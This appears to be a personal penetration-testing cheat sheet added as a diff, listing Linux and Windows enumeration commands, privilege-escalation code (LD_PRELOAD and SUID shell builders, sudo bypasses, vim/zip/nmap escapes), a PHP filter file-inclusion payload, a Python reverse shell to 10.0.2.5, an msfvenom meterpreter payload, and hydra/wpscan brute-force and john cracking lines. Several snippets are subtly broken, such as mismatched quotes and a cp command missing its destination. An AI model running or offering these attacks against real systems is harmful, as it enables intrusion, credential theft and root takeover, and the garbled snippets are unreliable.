@@ -1,0 +1,185 @@
+******NOTE*****
+always do this whenever you login to a system so you get all possible info about the system
+whoami
+id
+uname -a
+cat /proc/version
+cat /etc/issue
+cat /etc/passwd 
+cat /etc/shadow
+cat /etc/cron.d
+cat /etc/crontab
+ps aux # this will show all running process
+ifconfig
+ip route
+arp -a
+locate password
+find / -name password 2>/dev/null
+history
+sudo -l 
+sudo -u#-1 /bin/bash  #for sudo version < 1.8.28
+************************************
+to use LD_PRELOAD, write save this to a library.c file
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void_init(){
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+}
+
+then compile and use the command to exec it
+
+gcc -fPIC -shared -o /tmp/library.so library.c -nostartfiles
+sudo LD_PRELOAD=/tmp/library.so nmap
+
+to change shell from an suid not found file,
+
+#include <stdio.h>
+#include <stdlib.h>
+static void inject()__attribute__((constructor));
+
+void inject(){
+        system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+
+single line suid command
+echo "int main(){setgid(0);setuid(0);system('/bin/bash');return 0;}'>/tmp/service.c 
+
+to add to path
+export PATH=/tmp:$PATH
+
+************************************
+running command with zip
+
+sudo -u root /path-to-zip-file /path-to-output -T --unzip-command="sh -c /bin/bash"
+
+************************************
+spawning a shell through python
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+************************************
+file inclusion/path travasal
+
+goto https://books.hacktricks.xyz
+
+http://10.0.2.4/?lang=php://filter/convert.base64-encode/resource=index
+
+************************************
+creating a python reverse shell
+
+goto https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.5",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+************************************
+list root commands that a user is allowed to do
+
+sudo -l
+************************************
+
+bruteforce login
+
+cat fsocity.dic|sort -u|uniq > mydic.txt
+
+wpscan --url 10.0.2.6 -P mydic.dic --usernames Elliot
+
+hydra -V -L fsocity.dic -p root 10.0.2.6 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
+
+************************************
+find binaries that have suid bit set (root)
+
+find / -perm -u=s -type f 2>/dev/null
+find / -perm /4000 2>/dev/null
+
+find suid permissions to files
+
+find / -type f -perm -04000 -ls 2>/dev/null
+************************************
+find executable commands run by users
+
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+
+************************************
+spawn shell through nmap 
+
+https://gtfobins.github.io/gtfobins/nmap/
+
+nmap --interactive
+nmap> !sh 
+
+***********************************
+spawn shell through vim
+
+sudo /usr/bin/vim -c '!/bin/bash'
+sudo /usr/bin/vim -c '!/bin/sh'
+
+************************************
+ssh connect by sending ssh-dss key pair
+
+ssh -oHostKeyAlgorithms=+ssh-dss user@10.10.178.121
+
+***********************************
+read single line of file through apache2 service
+
+sudo /usr/sbin/apache2 -f /etc/passwd
+sudo /usr/sbin/apache2 -f /etc/shadow 
+
+**********************************
+crack password using john
+
+john --wordlist=/usr/share/wordlists/sqlmap.txt password.txt
+john --show password.txt 
+
+********************************
+trace suid path
+
+strace /usr/local/bin/suid-so 2>&1 | more
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+
+********************************
+cron jobs excalation
+
+cat /etc/cron.d
+cat /etc/crontab
+
+echo 'cp /bin/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+chmod +x /home/user/overwrite.sh
+
+/tmp/bash -p
+***********************************
+ftp 10.10.10.5
+
+nikto -host http://10.10.10.5
+
+dirb http://10.10.10.5
+
+msfvenom -p windows/meterpreter/reverse_tcp HOST=10.10.14.8 LPORT=4242 -f aspx > shell.aspx
+
+windows commands
+systeminfo
+whoami
+whoami /priv
+hostname
+whoami /groups
+net user
+ipconfig
+arp -a
+netstat
+netstat -ano
+route print
+findstr /si password *.txt
+findstr /si password *.ini
+findstr /si password sc query windefend
+sc query type= service
+netsh firewall show state
+
+using msfconsole
+run post/multi/recon/local_exploit_suggester
+
